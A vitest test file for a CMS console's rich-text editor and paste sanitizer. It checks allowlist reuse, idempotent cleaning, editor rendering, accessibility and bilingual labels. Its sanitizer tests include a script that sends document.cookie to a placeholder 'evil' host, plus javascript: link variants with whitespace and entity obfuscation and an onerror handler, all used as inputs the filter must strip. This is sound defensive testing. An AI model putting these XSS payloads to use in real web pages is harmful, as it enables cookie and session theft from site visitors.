/**
 * #246 / BK-13.8: the body is written as a page, not as source.
 *
 * The owner's third sentence, still open after 13.7 cleaned the *fields*: *"still cms has HTML
 * tags apear in editors"*. Two columns are printed as markup by the site — an article's
 * `content` and an offer's `body` — and both opened as a textarea holding
 * `<p class="wp-block-paragraph">`. This suite is the proof that the tags are gone from the
 * console and nowhere else:
 *
 *   - **the paste filter is the server's allowlist, read in a browser.** Not a second opinion
 *     about what HTML is fine: the same three lists, imported. A cleaner that disagrees with
 *     `sanitizeRichHtml()` either eats words the person pasted or lets a body change when it is
 *     saved.
 *   - **it settles.** `cleanPaste(cleanPaste(x))` is `cleanPaste(x)`, the same fixed-point
 *     discipline `plainText()` follows, because a filter applied on read and on write has to
 *     stop changing its own answer.
 *   - **the row that holds markup stops being a text box.** Asserted from the editor's source,
 *     in order: the `html` branch is taken before the textarea is.
 *   - **what the surface actually renders.** `role="textbox"`, `aria-multiline`, the row's own
 *     `id`, eleven named tool buttons, no `<textarea>` anywhere in the tree — a real render, not
 *     a regex about one.
 */
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';

import { catalogFor } from '../src/lib/console/messages';
import { cleanPaste } from '../src/lib/console/paste-filter';
import { isAllowedHref } from '../src/lib/content/rich-policy';
import { RICH_ALLOWED_TAGS } from '../src/lib/content/rich-policy';
import { RichEditor } from '../src/components/console/RichEditor';
import type { MessageKey } from '../src/lib/console/messages';

const read = (...parts: string[]): string => readFileSync(join(process.cwd(), ...parts), 'utf8');

const editorSource = read('src', 'components', 'console', 'ConsoleEditor.tsx');
const richSource = read('src', 'components', 'console', 'RichEditor.tsx');
const filterSource = read('src', 'lib', 'console', 'paste-filter.ts');
const engineSource = read('src', 'lib', 'content', 'rich.ts');
const outSource = read('src', 'lib', 'wp', 'sanitize.ts');

/** Declarations, not prose: `ui-primitives.test.ts` strips the comments for the same reason —
 *  a header that quotes the rule it replaced is not a second definition of it. */
const code = (text: string): string => text.replace(/\/\*[\s\S]*?\*\//g, '');
// Slice 0 of the console redesign: the editor is a console component and its sheet is the
// console kit, not the public site's control layer.
const kit = code(read('src', 'app', 'console', 'console-kit.css'));

/** The first declaration block for a selector, exactly as `ui-primitives.test.ts` reads one. */
function rule(source: string, selector: string): string {
  const start = source.indexOf(`\n${selector} {`);
  expect(start, `${selector} is styled`).toBeGreaterThan(-1);
  return source.slice(start, source.indexOf('}', start));
}

describe('a paste keeps the words and loses the markup nobody allowed', () => {
  it('keeps the prose the site itself prints, class and all', () => {
    const body = '<p class="wp-block-paragraph">ديرما بن <strong>للشعر</strong></p>';
    expect(cleanPaste(body)).toBe(body);
  });

  it('keeps a table whole, because a block model would have to throw it away', () => {
    const table = '<table><tbody><tr><td>a</td><th scope="x">b</th></tr></tbody></table>';
    expect(cleanPaste(table)).toBe('<table><tbody><tr><td>a</td><th>b</th></tr></tbody></table>');
  });

  it('discards a script with its contents, not as a sentence', () => {
    const out = cleanPaste('<p>keep</p><script>fetch("//evil/?c="+document.cookie)</script>');
    expect(out).toBe('<p>keep</p>');
    expect(out).not.toMatch(/fetch|evil|document/i);
  });

  it('strips an inline style and keeps the element it was hung on', () => {
    expect(cleanPaste('<span style="position:fixed;inset:0" class="note">words</span>')).toBe('<span class="note">words</span>');
  });

  it('drops a `javascript:` address and the words around it survive', () => {
    const out = cleanPaste('<a href="javascript:alert(1)" title="t">click</a>');
    expect(out).toBe('<a title="t">click</a>');
  });

  it('does not read a scheme that has been padded with whitespace or a newline', () => {
    expect(isAllowedHref('java\nscript:alert(1)')).toBe(false);
    expect(isAllowedHref(' javascript:alert(1)')).toBe(false);
    expect(cleanPaste('<a href="java\nscript:alert(1)">x</a>')).toBe('<a>x</a>');
    // The entity is what an email client actually sends, and the attribute is decoded before it
    // is judged — so the same refusal has to hold after `&#09;` becomes a tab.
    expect(cleanPaste('<a href="java&#09;script:alert(1)">x</a>')).toBe('<a>x</a>');
    expect(cleanPaste('<a href="&#106;avascript:alert(1)">x</a>')).toBe('<a>x</a>');
  });

  it('drops an event handler an image arrived with, and keeps the picture', () => {
    expect(cleanPaste('<img src="/uploads/202610/a.webp" onerror="alert(1)" alt="a">')).toBe('<img src="/uploads/202610/a.webp" alt="a">');
  });

  it('makes a new tab unreachable from the tab that opened it', () => {
    expect(cleanPaste('<a href="/a" target="_blank">x</a>')).toBe('<a href="/a" target="_blank" rel="noopener noreferrer">x</a>');
  });

  it('keeps the text of a tag nobody knows instead of eating the sentence', () => {
    expect(cleanPaste('<marquee>the words</marquee>')).toBe('the words');
  });

  it('leaves a comment out of the body', () => {
    expect(cleanPaste('<p>a</p><!-- TODO b -->')).toBe('<p>a</p>');
  });

  it('treats a person’s less-than as the text it is', () => {
    const prose = '12 < 15 and <3 — no tag here';
    expect(cleanPaste(prose)).toBe(prose);
  });

  it('reads a quoted attribute containing a bracket as one attribute', () => {
    expect(cleanPaste('<a href="/x" title="a > b">x</a>')).toBe('<a href="/x" title="a > b">x</a>');
    // …and the same parse is what refuses `title` on a paragraph: the policy gives it to `a`
    // and `img` only, so a token the scanner had cut in half could not have been refused at all.
    expect(cleanPaste('<p title="a > b">x</p>')).toBe('<p>x</p>');
  });

  it('settles, so a filter on read and a filter on write cannot shave the same body twice', () => {
    const messy = '<div style="x"><script>evil()</script><a href="javascript:1">keep <b>me</b></a></div>';
    const once = cleanPaste(messy);
    expect(cleanPaste(once)).toBe(once);
  });

  it('answers an empty body with an empty body', () => {
    expect(cleanPaste('')).toBe('');
  });
});

describe('one allowlist, three doors', () => {
  it('is defined once and imported everywhere', () => {
    expect(engineSource).toContain("from './rich-policy'");
    expect(outSource).toContain('from "../content/rich-policy"');
    expect(filterSource).toContain("from '@/lib/content/rich-policy'");
    // The engine file no longer owns the list, so it cannot be the only place it is written down.
    expect(engineSource).not.toMatch(/export const RICH_ALLOWED_TAGS/);
  });

  it('leaves the paste filter no private copy of the tag list', () => {
    expect(filterSource).not.toMatch(/'p', 'br'/);
    expect(filterSource).not.toMatch(/allowedTags:/);
    expect(filterSource).not.toMatch(/allowedAttributes:/);
  });

  it('keeps every tag the policy allows and refuses one it does not', () => {
    for (const tag of ['p', 'h2', 'ul', 'li', 'blockquote', 'a', 'img', 'table', 'td', 'strong', 'span', 'div']) {
      expect(RICH_ALLOWED_TAGS).toContain(tag);
      const open = tag === 'img' ? `<img src="${'/uploads/a.webp'}">` : `<${tag}>words</${tag}>`;
      expect(cleanPaste(open), `${tag} survives`).toContain(`<${tag}`);
    }
    for (const gone of ['script', 'style', 'iframe', 'form', 'svg', 'object', 'marquee', 'h1']) {
      expect(RICH_ALLOWED_TAGS, `${gone} is not allowed`).not.toContain(gone);
      expect(cleanPaste(`<${gone}>words</${gone}>`), `${gone} goes`).not.toContain(`<${gone}`);
    }
  });
});

describe('the row that holds markup stops being a text box', () => {
  it('takes the editor branch before the textarea branch', () => {
    expect(editorSource).toContain('if (field.format === \'html\')');
    const rich = editorSource.indexOf('<RichEditor');
    const textarea = editorSource.indexOf('<Textarea');
    expect(rich).toBeGreaterThan(-1);
    expect(textarea).toBeGreaterThan(-1);
    expect(rich, 'the html branch is taken first').toBeLessThan(textarea);
  });

  it('hands the surface the row’s identity, label and direction', () => {
    expect(editorSource).toMatch(/<RichEditor[\s\S]*?value=\{text\}/);
    expect(editorSource).toMatch(/inputId=\{id\}/);
    expect(editorSource).toMatch(/title=\{label\}/);
    expect(editorSource).toMatch(/rtl=\{locale === 'ar'\}/);
  });

  it('keeps the imported page document as source, on purpose', () => {
    // `format: 'source'` is the homepage's hero document; a WYSIWYG over it would rewrite the
    // shape the site reads. It stays a textarea, and the editor's own note says why.
    expect(editorSource).toMatch(/field\.kind === 'json' \? <ImageGallery/);
    expect(read('src', 'lib', 'content', 'format.ts')).toMatch(/'plain' \| 'html' \| 'source'/);
  });

  it('leaves no other body field a place to type a tag', () => {
    const kinds = read('src', 'lib', 'content', 'kinds.ts');
    expect((kinds.match(/format: 'html'/g) ?? []).length).toBe(2);
    expect((kinds.match(/format: 'source'/g) ?? []).length).toBe(1);
  });
});

describe('what the person sees is a page, not a document’s source', () => {
  const labels = catalogFor('en');

  const markupOf = (props: Partial<React.ComponentProps<typeof RichEditor>> = {}): string =>
    renderToStaticMarkup(
      createElement(RichEditor, {
        labels,
        value: '<p>hello</p>',
        disabled: false,
        inputId: 'field-content',
        title: 'Body',
        rtl: false,
        onChange: () => {},
        ...props,
      }),
    );

  it('renders an editable surface with the row’s own id', () => {
    const markup = markupOf();
    expect(markup).toMatch(/class="console-rich-surface"/);
    expect(markup).toMatch(/id="field-content"/);
    expect(markup).toMatch(/role="textbox"/);
    expect(markup).toMatch(/aria-multiline="true"/);
    expect(markup).toMatch(/aria-label="Body"/);
    // React serializes the prop by its JS name; the browser lowercases it when it parses.
    expect(markup).toMatch(/contentEditable="true"/);
  });

  it('has no text box in it anywhere', () => {
    expect(markupOf()).not.toContain('<textarea');
    expect(markupOf()).not.toMatch(/<input[^>]*type="text"/);
  });

  it('names every tool, in the toolbar and to a screen reader', () => {
    const markup = markupOf();
    expect(markup).toMatch(/role="toolbar"/);
    expect(markup).toContain('aria-label="Text tools"');
    const buttons = markup.match(/<button/g)?.length ?? 0;
    expect(buttons).toBe(11);
    for (const name of ['Bold', 'Italic', 'Heading', 'Subheading', 'Paragraph', 'Quote', 'Bulleted list', 'Numbered list', 'Link', 'Remove link', 'Insert photo']) {
      expect(markup, `${name} is a button`).toContain(`>${name}</button>`);
    }
  });

  it('says something while the field is empty, and nothing when it is not', () => {
    expect(markupOf()).toMatch(/data-placeholder="Write here\. No HTML tags appear in this editor\."/);
    // A real `placeholder` attribute belongs on an `<input>`, never on a surface that shows its
    // own words: the CSS uses `::before`, so nothing is there until the browser sees empty.
    expect(markupOf()).not.toMatch(/(^|[^-])placeholder="/);
  });

  it('reads Arabic bodies right-to-left', () => {
    expect(markupOf({ rtl: true })).toContain('dir="rtl"');
    expect(markupOf({ rtl: false })).toContain('dir="ltr"');
  });

  it('gives up the surface, the tools and the upload together when the person may not write', () => {
    const markup = markupOf({ disabled: true });
    expect(markup).toMatch(/contentEditable="false"/);
    expect(markup).toMatch(/data-disabled="true"/);
    expect(markup).toMatch(/<input[^>]*type="file"[^>]*disabled=""/);
  });

  it('renders nothing of the body itself — the surface is filled by the browser, not by React', () => {
    // Deliberate: React writing `value` into the surface on every render is what moves a caret
    // to the start of the document, so the component owns its markup in an effect instead.
    expect(markupOf()).not.toContain('<p>hello</p>');
    expect(richSource).toMatch(/if \(!el \|\| el\.innerHTML === value\) return;/);
    expect(richSource).toMatch(/el\.innerHTML = cleanPaste\(value\);/);
  });
});

describe('the catalog, the sheet and the address', () => {
  /** Quoted keys, however the component reaches them: `labels['rich.bold']` and the bare
   *  `'rich.paste_cleaned'` handed to `setNotice()` are the same promise to the catalog. */
  const used = [...richSource.matchAll(/['"](rich\.[a-z_]+)['"]/g)].map((match) => match[1]!);

  it('has a sentence for every word the control says, in both languages', () => {
    expect(used.length).toBeGreaterThan(12);
    const arabic = catalogFor('ar');
    for (const key of new Set(used)) {
      expect(arabic[key as MessageKey], `${key} in Arabic`).toBeTruthy();
      expect(catalogFor('en')[key as MessageKey], `${key} in English`).toBeTruthy();
      expect(arabic[key as MessageKey]).not.toBe(catalogFor('en')[key as MessageKey]);
    }
  });

  it('tells the person what a paste cost them, and does not do it silently', () => {
    expect(used).toContain('rich.paste_cleaned');
    expect(richSource).toMatch(/setNotice\(cleaned === html \? null : 'rich\.paste_cleaned'\)/);
    expect(richSource).toMatch(/cleanPaste\(html\)/);
  });

  it('inserts a photo at the address the server returned, and nowhere from a box', () => {
    expect(richSource).toMatch(/<img src="\$\{outcome\.value\.src\}"/);
    expect(richSource).toContain("from '@/lib/console/upload'");
    expect(richSource).toMatch(/accept="image\/png,image\/jpeg,image\/webp,image\/gif"/);
    // The one typed address is the link row, and it is checked before it is used.
    expect(richSource).toMatch(/if \(!LINK_SCHEMES\.test\(href\) \|\| !isAllowedHref\(href\)\)/);
    expect(richSource).toMatch(/aria-label=\{labels\['rich\.link'\]\}/);
  });

  it('styles every class it puts on a node', () => {
    const classes = [...new Set([...richSource.matchAll(/(?:className="|clsx\(')(console-rich[a-z-]*)/g)].map((match) => match[1]!))];
    expect(classes.length).toBeGreaterThan(4);
    for (const name of classes) expect(rule(kit, `.${name}`), `.${name} is styled`).toBeTruthy();
    expect(rule(kit, '.console-rich-surface')).toMatch(/min-block-size: 12rem;/);
    expect(rule(kit, '.console-rich-surface')).not.toMatch(/min-height: [0-9.]+(rem|px)/);
    expect(rule(kit, '.console-rich-surface:empty::before')).toMatch(/content: attr\(data-placeholder\)/);
    expect(kit).not.toMatch(/outline:/);
    expect(kit).not.toMatch(/border-radius: [0-9.]+(rem|px|%)/);
  });

  it('does not touch the markup the site prints', () => {
    // The editor is a console component; the renderer is a server component with its own
    // sanitizer. Neither one may become the other's.
    expect(richSource).not.toMatch(/sanitizeHtml|dangerouslySetInnerHTML/);
    expect(richSource).toMatch(/^'use client';/);
  });
});
